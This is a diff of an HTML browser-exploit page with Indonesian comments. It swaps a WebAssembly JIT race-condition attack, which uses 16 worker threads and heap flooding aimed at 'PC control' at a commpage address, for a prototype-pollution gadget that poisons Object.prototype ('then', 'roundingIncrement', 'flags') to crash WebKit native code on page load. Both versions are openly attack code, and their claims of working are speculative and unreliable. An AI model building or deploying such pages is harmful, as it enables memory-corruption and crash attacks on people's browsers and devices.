@@ -1,156 +1,118 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Wasm JIT Race Condition (BRUTAL MODE)</title>
-    <style>
-        body { background-color: #111; color: #0f0; font-family: courier; }
-        #log { border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; }
-        .success { color: #ff00ff; font-weight: bold; font-size: 1.2em; }
-    </style>
+    <title>Prototype Pollution to Native Crash</title>
 </head>
 <body>
-    <h1>Wasm JIT Chaos (Target: PC Control)</h1>
-    <p>Target: 0x0000000FFFFFC320 (Commpage)</p>
-    <div id="status">INIT: Mempersiapkan Nuclear Threads...</div>
-    <div id="log"></div>
+
+    <h1>Prototype Pollution Gadget</h1>
+    <p>Target: 0x0000000FFFFFC320</p>
+    <div id="status">INIT: Menyuntikkan Racun Prototype...</div>
+    <div id="log-area" style="border:1px solid #ccc; height:300px; overflow:scroll; font-family:monospace;"></div>
 
     <script>
-        // --- KONSTANTA COMM PAGE ---
-        // Target: Kita ingin PC (Program Counter) melompat ke sini
+        // --- TARGET CONSTANTS ---
         const COMM_PAGE_TARGET = BigInt("0x0000000FFFFFC320");
-        
-        // Memecah menjadi 32-bit integer untuk SharedArrayBuffer
-        const LOW = Number(COMM_PAGE_TARGET & 0xFFFFFFFFn);
-        const HIGH = Number(COMM_PAGE_TARGET >> 32n);
+        const TARGET_VAL = Number(COMM_PAGE_TARGET & 0xFFFFFFFFn); // 32-bit slice
 
-        const LOG_EL = document.getElementById('log');
+        const logger = document.getElementById('log-area');
         function log(msg) {
-            LOG_EL.innerHTML += `<div>[${(performance.now()/1000).toFixed(3)}] ${msg}</div>`;
-            LOG_EL.scrollTop = LOG_EL.scrollHeight;
+            logger.innerHTML += `<div>[${performance.now().toFixed(0)}] ${msg}</div>`;
         }
 
-        // --- 1. MEMBUAT WEBASSEMBLY MODULE ---
-        // Modul Wasm minimal yang mengimpor fungsi dan memanggilnya.
-        // Kita akan mencoba menimpa index tabel fungsi ini.
-        const wasmCode = new Uint8Array([
-            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // Magic & Version
-            0x01, 0x04, 0x01, 0x60, 0x00, 0x00,             // Type section
-            0x02, 0x0d, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x03, 0x72, 0x75, 0x6e, 0x00, 0x00, // Import "env.run"
-            0x03, 0x02, 0x01, 0x00,                         // Function section
-            0x07, 0x05, 0x01, 0x01, 0x6d, 0x00, 0x00,       // Export "m"
-            0x0a, 0x06, 0x01, 0x04, 0x00, 0x10, 0x00, 0x0b  // Code: call 0 (env.run)
-        ]);
+        // --- 1. FUNGSI POLLUTION ---
+        // Fungsi recursive merge yang sengaja dibuat rentan untuk mencemari __proto__
+        function pollute(target, source) {
+            for (let key in source) {
+                if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
+                    // Ini adalah celahnya. Kita membiarkan polusi terjadi pada Object.prototype
+                    Object.prototype[source[key].name] = source[key].value;
+                }
+            }
+        }
 
-        // --- 2. WORKER SCRIPT (CHAOS ENGINE) ---
-        // Script ini akan dijalankan oleh BANYAK thread sekaligus
-        const workerScript = `
-            onmessage = async function(e) {
-                const { sab, id, targetLow, targetHigh, wasmBytes } = e.data;
-                const view = new Int32Array(sab);
-                
-                // Mode: ATTACKER (Writer)
-                // Terus menerus menulis alamat target ke memori bersama
-                if (id % 2 === 0) {
-                    while (true) {
-                        // Menulis alamat Commpage ke index 0
-                        // Atomics.store memaksa sinkronisasi memori (memperparah race)
-                        Atomics.store(view, 0, targetLow); 
-                        Atomics.store(view, 1, targetHigh);
-                        
-                        // Fuzzing: Kadang tulis nilai sampah untuk membingungkan JIT
-                        if (Math.random() < 0.01) Atomics.store(view, 0, 0x41414141);
-                    }
-                } 
-                // Mode: VICTIM (Executor)
-                // Mencoba compile dan run Wasm secepat mungkin
-                else {
-                    const importObject = {
-                        env: {
-                            run: function() {
-                                // Fungsi dummy. Kita berharap Wasm TIDAK memanggil ini,
-                                // tapi melompat ke alamat yang kita inject di SAB.
-                                return 1;
-                            }
-                        }
-                    };
-
-                    while (true) {
-                        try {
-                            // Kompilasi instan berulang-ulang
-                            // Ini memicu alokasi memori RWX di JIT Server
-                            const module = await WebAssembly.compile(wasmBytes);
-                            const instance = await WebAssembly.instantiate(module, importObject);
-                            
-                            // EKSEKUSI!
-                            // Di sinilah kita berharap pointer function table korup
-                            instance.exports.m();
-                        } catch (err) {
-                            // Abaikan error, terus paksa
-                        }
+        // --- 2. PAYLOAD RACUN ---
+        // Kita akan mencemari properti yang sering digunakan C++ secara internal.
+        // Properti seperti 'then', 'length', 'size', 'buffer', 'handle' sering diintip oleh C++.
+        
+        const poisonPayload = {
+            "__proto__": {
+                name: "then", // Menargetkan Promise logic di C++
+                value: TARGET_VAL 
+            }
+        };
+        
+        const poisonPayload2 = {
+             "__proto__": {
+                name: "roundingIncrement", // Menargetkan Intl.NumberFormat di C++
+                value: { 
+                    valueOf: () => { 
+                        log("⚠️ C++ mengakses roundingIncrement!"); 
+                        return TARGET_VAL; 
                     }
                 }
-            };
-        `;
+            }
+        };
 
-        // --- 3. PELUNCURAN SERANGAN ---
-        async function launchNuke() {
-            log("🚀 MELUNCURKAN MODE CHAOS V7...");
+        // --- 3. EKSEKUSI ---
+        function runSilentAttack() {
+            log("💉 Phase 1: Menyuntikkan Polusi ke Object.prototype...");
             
-            // Shared Memory untuk Race Condition
-            const sharedBuffer = new SharedArrayBuffer(1024); // 1KB cukup untuk pointer
-            
-            // Membuat Blob URL untuk Worker
-            const blob = new Blob([workerScript], { type: 'application/javascript' });
-            const workerUrl = URL.createObjectURL(blob);
-            
-            const WORKER_COUNT = 16; // JUMLAH THREAD BRUTAL (Sesuaikan dengan core HP)
-            let workers = [];
+            // Lakukan polusi
+            try {
+                // Polusi 1: 'then' property (Sangat berbahaya untuk Promise native)
+                Object.prototype.then = TARGET_VAL; 
+                log("Polusi 'then' berhasil disuntikkan.");
 
-            log(`🔥 Mengerahkan ${WORKER_COUNT} Worker Threads...`);
-
-            for (let i = 0; i < WORKER_COUNT; i++) {
-                const w = new Worker(workerUrl);
-                w.postMessage({
-                    sab: sharedBuffer,
-                    id: i,
-                    targetLow: LOW,
-                    targetHigh: HIGH,
-                    wasmBytes: wasmCode
+                // Polusi 2: Gadget spesifik Intl (Internationalization)
+                // Intl sering memiliki parser C++ yang kompleks
+                Object.defineProperty(Object.prototype, 'roundingIncrement', {
+                    get: function() {
+                        log("🔥 TRIGGER: WebKit C++ membaca properti terpolusi!");
+                        return 0x0000000FFFFFC320n; // Mengembalikan BigInt Commpage
+                        // Kita berharap C++ mencoba mengonversi ini menjadi pointer/integer dan crash
+                    }
                 });
-                workers.push(w);
+                
+            } catch(e) {
+                log("Error saat polusi: " + e.message);
             }
 
-            log("⚔️ Race Condition dimulai. JIT Compiler sedang diserang.");
-            log("Tunggu 10-20 detik. Jika freeze, itu tanda bagus.");
+            log("⏳ Phase 2: Memicu Native Code Paths...");
 
-            // --- 4. MEMORY PRESSURE TAMBAHAN ---
-            // Sambil worker berperang, main thread membanjiri Heap
-            // untuk mempersulit OS melakukan cleaning.
-            setTimeout(() => {
-                log("⚠️ Mengaktifkan HEAP FLOODING di Main Thread...");
-                let junk = [];
-                setInterval(() => {
-                    try {
-                        // Alokasi ArrayBuffer besar (10MB) berulang-ulang
-                        for(let k=0; k<100; k++) {
-                            junk.push(new ArrayBuffer(1024 * 1024 * 10));
-                        }
-                        // Buang sebagian untuk memicu GC (Garbage Collection)
-                        // GC yang berjalan saat JIT bekerja = RESEP BENCANA
-                        if (junk.length > 500) junk = []; 
-                        
-                        log(`Heap Pressure: ${junk.length} objek besar aktif.`);
-                    } catch(e) {
-                        log("Heap penuh. Bagus.");
-                        junk = []; // Reset dan ulangi
+            // Trigger A: Promise Internal Confusion
+            // C++ Microtask queue mungkin bingung karena semua objek sekarang punya 'then'
+            Promise.resolve('test').catch(e => {});
+
+            // Trigger B: Intl.NumberFormat (Target Utama)
+            // Fitur ini membaca banyak opsi dari prototype jika tidak disediakan.
+            try {
+                // Kita membuat formatter tanpa opsi, memaksanya melihat ke prototype
+                const formatter = new Intl.NumberFormat('en-US', { style: 'percent' });
+                
+                // Paksa pemformatan angka aneh untuk memicu logic path C++
+                formatter.format(123.456);
+                
+                log("Intl trigger selesai. Jika tidak crash, coba refresh.");
+            } catch (e) {
+                log("Intl Error: " + e.message);
+            }
+            
+            // Trigger C: RegExp Compilation
+            // RegExp engine juga membaca properti 'exec', 'flags', dll.
+            try {
+                Object.prototype.flags = {
+                    toString: () => { 
+                        log("⚠️ RegExp mengakses flags!"); 
+                        return "g"; // Normal return
                     }
-                }, 100);
-            }, 2000);
+                };
+                let r = /abc/;
+                r.exec("abc");
+            } catch(e) {}
         }
 
-        document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(launchNuke, 1000);
-        });
+        setTimeout(runSilentAttack, 1000);
 
     </script>
 </body>
